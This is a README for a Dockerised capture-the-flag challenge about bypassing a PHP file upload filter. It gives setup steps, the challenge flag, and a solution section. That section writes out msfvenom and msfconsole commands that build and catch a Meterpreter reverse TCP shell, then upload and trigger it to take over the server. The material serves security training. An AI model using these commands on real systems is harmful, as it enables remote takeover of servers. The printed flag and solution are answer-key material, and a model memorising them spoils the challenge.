# haaukins_upload_bypass

**Description**

This upload bypass CTF challenge was created for Haaukins platform. The main goal of the project is finding the vulnerabilities of the file upload systems and exploit the vulnerability by using Metasploit Framework. In this project, an Apache2 server created and website is published on the server. PHP is used for back-end of the website. This application is containerized with Docker. 

**Prerequisite**

Docker must be installed in your local machine to run this challenge.

**How to Run?**

1- git clone https://gitlab.com/faraklit/haaukins_upload_bypass.git

2- cd haaukins_upload_bypass/

3- docker build -t haaukins_upload_bypass .

4- docker run -d -p 80:80 -e FLAG="FLAG=I thought that I saw a pretty cat. Yes, I did I did!" haaukins_upload_bypass

5- Browse localhost:80/

**Solution**

1- Create php reverse tcp code
- msfvenom -p php/meterpreter/reverse_tcp LHOST="MACHINE IP ADDRESS" LPORT=4444 -f raw -o malware.php

2- Open msfconsole and enter following codes:
- use exploit/multi/handler
- set payload php/meterpreter/reverse_tcp
- set LHOST "MACHINE IP ADDRESS"
- exploit

3- Upload "malware.php" to the system

4- Browse to localhost/uploads

5- Click "malware.php"

6- Reverse shell must be initialized and commands can be entered

7- Traverse in the directories to find the flag!

Video link: https://www.youtube.com/watch?v=R2pFNEi_3KA
